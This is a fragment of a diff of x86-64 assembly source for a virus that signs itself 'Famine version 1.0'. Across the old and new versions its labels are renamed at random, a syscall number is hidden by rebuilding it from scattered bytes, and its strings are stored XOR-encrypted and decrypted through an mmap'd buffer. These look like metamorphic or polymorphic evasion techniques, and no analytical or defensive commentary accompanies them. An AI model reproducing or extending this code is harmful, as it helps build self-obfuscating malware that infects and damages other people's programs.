-jmp B8kVNDp5l
+mov qword INF(Hp2r39UiMa.MAo60), -1
+jmp TEi4b7Y
 
-uT8SHOJhBe:
-mov rdi, FAM(EjCzV7zWv.QpxZLmj)
+tLme96eBX:
+mov rdi, FAM(vIpwyUO8.DmWCpO9p0X)
 cmp rdi, 0 
-jle B8kVNDp5l
-mov rax, 0x3
+jle TEi4b7Y
+push r15
+push r14
+movq r15, xmm15
+movzx r14, byte [r15 + 33]
+shl r14, 0x18
+mov  rax, r14 
+movzx r14, byte [r15 + 93]
+shl r14, 0x10
+or  rax, r14 
+movzx r14, byte [r15 + 153]
+shl r14, 0x8
+or  rax, r14 
+movzx r14, byte [r15 + 213]
+or  rax, r14 
+pop r14
+pop r15
 syscall
-mov rdi, FAM(EjCzV7zWv.pa98hvWY)
-mov rsi, FAM(EjCzV7zWv.SJTK2)
-call hJjRO
-or qword FAM(EjCzV7zWv.QpxZLmj), -1
-jmp B8kVNDp5l
+mov rdi, FAM(vIpwyUO8.JVrBRyDiHX)
+mov rsi, FAM(vIpwyUO8.r6ieUyrMx)
+call PoZPrnQH
+or qword FAM(vIpwyUO8.DmWCpO9p0X), -1
+jmp TEi4b7Y
 
-B8kVNDp5l:
+TEi4b7Y:
 leave
 ret
 
-SPIuSsm:
+mj9YXte:
 mov rax, 60 
 xor rdi, rdi
 syscall
 
 ;strcpy(dst:rsi src: rdi) (without /0 at the end)
-KnAvt1mmz:
+jzzLQ:
 xor rcx, rcx
-tRvnGN:
+sWvwOxs2:
 cmp byte [rdi + rcx], 0 
-je FoPJ9dX
+je TqewbJXXR4
 mov al, byte [rdi + rcx]
 mov [rsi + rcx], al
 add rcx, 1 
-jmp tRvnGN
+jmp sWvwOxs2
 
-FoPJ9dX:
+TqewbJXXR4:
 
 ret
 
@@ -515,49 +801,77 @@ push rdx
 push r10
 push r8
 push r9
-mov rax, 0x9
-mov rdi, 0x0 
-mov rsi, 0x8c 
-mov rdx, 0x2| 0x4
-mov r10, 0x1
+mov rax, SYS_MMAP
+mov rdi, 0x0
+mov rsi, 0xf0
+mov rdx, PROT_READ | PROT_WRITE
+mov r10, 0x22
 mov r8, -1
-mov r9, 0x0 
+mov r9, 0x0
 syscall
 cmp rax, -1
 jl _end_map_int
 movq xmm15, rax
-mov qword [rax + 0], 0x00000000 
-mov qword [rax + 4], 0x02000000 
-mov qword [rax + 8], 0x00000000 
-mov qword [rax + 12], 0x00000000 
-mov qword [rax + 16], 0x00000000 
-mov qword [rax + 20], 0x00000000 
-mov qword [rax + 24], 0x00000000 
-mov qword [rax + 28], 0x00000000 
-mov qword [rax + 35], 0x00000000 
-mov qword [rax + 39], 0x46000000 
-mov qword [rax + 43], 0x00000000 
-mov qword [rax + 47], 0x00000000 
-mov qword [rax + 51], 0x00000000 
-mov qword [rax + 55], 0x00000000 
-mov qword [rax + 59], 0x00000000 
-mov qword [rax + 63], 0x00000000 
-mov qword [rax + 70], 0x00000000 
-mov qword [rax + 74], 0x4c001000 
-mov qword [rax + 78], 0x00000000 
-mov qword [rax + 82], 0x00000000 
-mov qword [rax + 86], 0x00000000 
-mov qword [rax + 90], 0x00000000 
-mov qword [rax + 94], 0x00000000 
-mov qword [rax + 98], 0x00000000 
-mov qword [rax + 105], 0x64000100 
-mov qword [rax + 109], 0x45200005 
-mov qword [rax + 113], 0x60030203 
-mov qword [rax + 117], 0x22020945 
-mov qword [rax + 121], 0x00440308 
-mov qword [rax + 125], 0x090b3c4d 
-mov qword [rax + 129], 0xd9000102 
-mov qword [rax + 133], 0x08101213 
+mov dword [rax + 0], 0x00000000
+mov dword [rax + 4], 0x00000000
+mov dword [rax + 8], 0x00000200
+mov dword [rax + 12], 0x00000000
+mov dword [rax + 16], 0x00000000
+mov dword [rax + 20], 0x00000000
+mov dword [rax + 24], 0x00000000
+mov dword [rax + 28], 0x00000000
+mov dword [rax + 32], 0x00000000
+mov dword [rax + 36], 0x00000000
+mov dword [rax + 40], 0x00000000
+mov dword [rax + 44], 0x00000000
+mov dword [rax + 48], 0x00000000
+mov dword [rax + 52], 0x00000000
+mov dword [rax + 56], 0x00000000
+mov dword [rax + 60], 0x00000000
+mov dword [rax + 64], 0x00000000
+mov dword [rax + 68], 0x00004600
+mov dword [rax + 72], 0x00000000
+mov dword [rax + 76], 0x00000000
+mov dword [rax + 80], 0x00000000
+mov dword [rax + 84], 0x00000000
+mov dword [rax + 88], 0x00000000
+mov dword [rax + 92], 0x00000000
+mov dword [rax + 96], 0x00000000
+mov dword [rax + 100], 0x00000000
+mov dword [rax + 104], 0x00000000
+mov dword [rax + 108], 0x00000000
+mov dword [rax + 112], 0x00000000
+mov dword [rax + 116], 0x04000000
+mov dword [rax + 120], 0x00000000
+mov dword [rax + 124], 0x00000000
+mov dword [rax + 128], 0x00004c00
+mov dword [rax + 132], 0x00000000
+mov dword [rax + 136], 0x00000000
+mov dword [rax + 140], 0x00001000
+mov dword [rax + 144], 0x00000000
+mov dword [rax + 148], 0x00000000
+mov dword [rax + 152], 0x00000000
+mov dword [rax + 156], 0x00000000
+mov dword [rax + 160], 0x00000000
+mov dword [rax + 164], 0x00000000
+mov dword [rax + 168], 0x00000000
+mov dword [rax + 172], 0x00000000
+mov dword [rax + 176], 0x66000000
+mov dword [rax + 180], 0x00000040
+mov dword [rax + 184], 0x00000001
+mov dword [rax + 188], 0x00004501
+mov dword [rax + 192], 0x00012000
+mov dword [rax + 196], 0x01000101
+mov dword [rax + 200], 0x01000000
+mov dword [rax + 204], 0x003c0005
+mov dword [rax + 208], 0x01030001
+mov dword [rax + 212], 0x00220302
+mov dword [rax + 216], 0x00000009
+mov dword [rax + 220], 0x00000045
+mov dword [rax + 224], 0x0b084400
+mov dword [rax + 228], 0x0100d94d
+mov dword [rax + 232], 0x12100802
+mov dword [rax + 236], 0x89070413
 _end_map_int:
 pop r9
 pop r8
@@ -572,11 +886,11 @@ _decrypt_str:
 ; rbx -> to_decrypt
 ; rcx == counter
 ; rdx == div modulo
-; r9 == len ubUxsS
+; r9 == len hQ26B
 ; r10 -> key_char
 ; r11 -> decrypted str (mmap)
 ; r12 == len to_decrypt
-; rsi -> ubUxsS
+; rsi -> hQ26B
 push rbx
 push rcx
 push rdx
@@ -587,19 +901,18 @@ push r11
 push r12
 mov rbx, rdi
 mov r12, rsi
-xor rdi, rdi 
-mov rdx, 0x03 
-mov r10, 0x22 
-mov r8, -1                      ; QpxZLmj = -1
-xor r9, r9 
-mov rax, 9 
+xor rdi, rdi                    ; addr = NULL (let kernel choose)
+mov rdx, 0x03                   ; PROT_READ | PROT_WRITE = 1 | 2 = 3
+mov r10, 0x22                   ; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
+mov r8, -1                      ; DmWCpO9p0X = -1
+xor r9, r9                      ; offset = 0
+mov rax, 9                      ; syscall number for mmap
 syscall
-cmp rax, 0 
+cmp rax, 0
 jl _decrypt_loop_end
-movq xmm15, rax
 mov r11, rax
-lea rsi, ubUxsS
-call L5FpB
+lea rsi, hQ26B
+call k2u1J7M
 mov r9, rax
 xor rcx, rcx
 xor rdx, rdx
@@ -608,14 +921,14 @@ cmp rcx, r12
 jge _decrypt_loop_end
 mov rax, rcx
 xor rdx, rdx
-cmp rcx, 0 
+cmp rcx, 0
 jne _no_zero
 xor rax, rax
 jmp _end_div
 _no_zero:
 div r9
 _end_div:
-movzx r10, byte [rsi + rdx] ; r10 == ubUxsS[rcx % ubUxsS_len]
+movzx r10, byte [rsi + rdx] ; r10 == key[rcx % key_len]
 xor r10b, [rbx + rcx]
 mov [r11 + rcx], r10b
 inc rcx
@@ -633,16 +946,16 @@ pop rbx
 ret
  
 ;; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
-ZOllo:
+u7w0sUhH:
 ;; rax == div quotient
 ;; rbx -> to_decrypt
 ;; rcx == counter
 ;; rdx == div modulo
-;; r9 == len ubUxsS
+;; r9 == len hQ26B
 ;; r10 -> key_char
 ;; r11 -> decrypted str (mmap)
 ;; r12 == len to_decrypt
-;; rsi -> ubUxsS
+;; rsi -> hQ26B
 ;push rbx
 ;push rcx
 ;push rdx
@@ -656,19 +969,19 @@ ZOllo:
 
 
 
-;mov r8, -1                      ; QpxZLmj = -1
+;mov r8, -1                      ; DmWCpO9p0X = -1
 
 
 ;syscall
 
 ;jl _decrypt_loop_end
 ;mov r11, rax
-;lea rsi, ubUxsS
-;call L5FpB
+;lea rsi, hQ26B
+;call k2u1J7M
 ;mov r9, rax
 ;xor rcx, rcx
 ;xor rdx, rdx
-Gm17tkQI8:
+nhhrFTJfVg:
 ;cmp rcx, r12
 ;jge _decrypt_loop_end
 ;mov rax, rcx
@@ -677,15 +990,15 @@ Gm17tkQI8:
 ;jne _no_zero
 ;xor rax, rax
 ;jmp _end_div
-iQJAF3lZ7:
+kNYRlr74:
 ;div r9
-JvX8cfYkK:
-;movzx r10, byte [rsi + rdx] ; r10 == ubUxsS[rcx % ubUxsS_len]
+TNMTro5Y5:
+;movzx r10, byte [rsi + rdx] ; r10 == hQ26B[rcx % hQ26B_len]
 ;xor r10b, [rbx + rcx]
 ;mov [r11 + rcx], r10b
 ;inc rcx
 ;jmp _decrypt_loop
-Jb7pl:
+lr3PpvV3:
 ;mov rax, r11
 ;pop r12
 ;pop r11
@@ -699,28 +1012,28 @@ Jb7pl:
 
 ; debug
 ; strlen(str:rsi)
-L5FpB:
+k2u1J7M:
 xor rcx, rcx
 
-yGEvS:
+VKpp7VpO:
 cmp byte [rsi + rcx], 0 
-je FTRzeCH
+je pAxDz
 inc rcx
-jmp yGEvS
+jmp VKpp7VpO
 
-FTRzeCH:
+pAxDz:
 mov rax, rcx
 ret
 
 
-bP7NyIW5wB dq 0x45 
-pDTWFt7 db 0x6B, 0x28, 0x21, 0x41, 0x05, 0x43, 0x2D, 0x2F, 0x06, 0x2A, 0x44, 0x19, 0x4D, 0x7B 
-GwMK34MPB4 db 0x05, 0x0F, 0x25, 0x5C, 0x5A, 0x5B, 0x2D, 0x0F, 0x06, 0x58 
-fyXEusC7    equ $ - GwMK34MPB4
-I7PoMa db 0x05, 0x0F, 0x25, 0x5C, 0x5A, 0x5B, 0x2D, 0x0F, 0x06, 0x6A, 0x2D 
-R608jI    equ $ - I7PoMa
-ubUxsS db 0x2A, 0x7B, 0x48, 0x2C, 0x75, 0x2F, 0x48, 0x7C, 0x72, 0x58, 0x2D, 0x77 
-Gvd6BlzaHK db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
-oipSFt db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
-KEuiL equ $ - oipSFt
-gLj4boEu: 
+adVCs dq 0x45 
+MVG2ahP0Fc db 0x29, 0x00, 0x32, 0x0F, 0x17, 0x5F, 0x17, 0x24, 0x1B, 0x25, 0x4A, 0x5B, 0x0F, 0x53 
+AGG22EWL db 0x47, 0x27, 0x36, 0x12, 0x48, 0x47, 0x17, 0x04, 0x1B, 0x57 
+cQZDYf2Uk    equ $ - AGG22EWL
+PKN8uGw6P db 0x47, 0x27, 0x36, 0x12, 0x48, 0x47, 0x17, 0x04, 0x1B, 0x65, 0x23 
+wWXKWUc    equ $ - PKN8uGw6P
+hQ26B db 0x68, 0x53, 0x5B, 0x62, 0x67, 0x33, 0x72, 0x77, 0x6F, 0x57, 0x23, 0x35 
+OElSK5C db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
+hrQyImQKGS db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
+tl4Qd equ $ - hrQyImQKGS
+sffRnF: 
